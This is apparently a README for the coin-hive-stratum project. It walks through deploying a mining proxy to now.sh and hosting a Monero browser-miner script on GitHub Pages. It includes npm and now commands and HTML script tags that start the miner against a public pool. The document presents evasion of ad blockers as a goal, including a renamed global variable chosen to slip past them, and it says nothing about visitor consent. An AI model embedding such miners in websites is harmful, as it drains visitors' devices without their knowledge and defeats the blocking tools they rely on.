Coin Hive Stratum
=================

Deploy `coin-hive-stratum` proxy **for free** to `now.sh` + `GitHub Pages` and avoid AdBlock.

## Server

Just deploy [this repo](https://deploy.now.sh/?repo=https://github.com/cazala/coin-hive-stratum) to `now.sh`

[![Deploy to now](https://deploy.now.sh/static/button.svg)](https://deploy.now.sh/?repo=https://github.com/cazala/coin-hive-stratum)

This will deploy a proxy instance to your `now.sh` account, and it will give you a url like this: `https://coin-hive-stratum-zmuahmjuur.now.sh`.

Finally, change the name of the instance. To do so, install `now` if you don't have it yet:

```
npm i -g now
```

Login with the same account where you deployed your proxy:

```
now login
```

And rename your proxy like this:

```
now alias coin-hive-stratum-zmuahmjuur.now.sh my-proxy.now.sh
```

Now your proxy is accessible from `wss://my-proxy.now.sh`.

This is **YOUR-SERVER-URL**.

## Assets

First, fork [this repo](https://github.com/cazala/coin-hive-stratum).

![fork](https://user-images.githubusercontent.com/2781777/33270099-a6af10da-d361-11e7-91ec-060d447fd1fb.gif)

Now, change its name to `my-proxy` (Settings > Rename).

<img width="359" alt="rename" src="https://user-images.githubusercontent.com/2781777/33243283-e1407e32-d2c1-11e7-8726-08b6728c0780.png">

This will create a github page under you github's account with all the required static assets.

After that you will be able to access the miner via `https://<YOUR-GITHUB-USERNAME>.github.io/my-proxy/m.js`

This is your **YOUR-CLIENT-URL**.

## Usage

Now instead of using CoinHive's miner:

```html
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
```

You should use your miner like this:

```html
<script src="YOUR-CLIENT-URL?proxy=YOUR-SERVER-URL?pool=HOST:PORT"></script>
```

This is an example of how it should look like:

```html
<script src="https://cazala.github.io/my-proxy/m.js?proxy=wss://my-proxy.now.sh?pool=pool.supportxmr.com:3333"></script>
```

Also, instead of using the `CoinHive` global variable use `CH` (this is to avoid AdBlock), ie:

```html
<script src="https://cazala.github.io/my-proxy/m.js?proxy=wss://my-proxy.now.sh?pool=pool.supportxmr.com:3333"></script>
<script>
  var miner = CH.Anonymous('SITE_KEY');
  miner.start();
</script>
```
